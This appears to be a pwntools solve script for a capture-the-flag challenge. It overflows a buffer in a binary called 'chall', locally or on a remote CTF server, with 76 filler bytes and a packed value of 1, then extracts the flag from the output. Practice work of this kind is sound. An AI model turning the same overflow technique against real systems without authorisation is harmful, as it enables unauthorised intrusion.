#!/usr/bin/env python3

from pwn import *
import re

context.log_level = logging.ERROR

exe = ELF("./chall")

context.binary = exe
context.terminal = ["termite","-e"]

def conn():
    if args.LOCAL:
        return process([exe.path])
    else:
        return remote("ctf.cybr.club", 2000)


def main():
    r = conn()

    r.sendline(b"A" * 76 + p32(1))

    print(re.search("(FLAG{.*})",r.recvall().decode()).group(1))


if __name__ == "__main__":
    main()
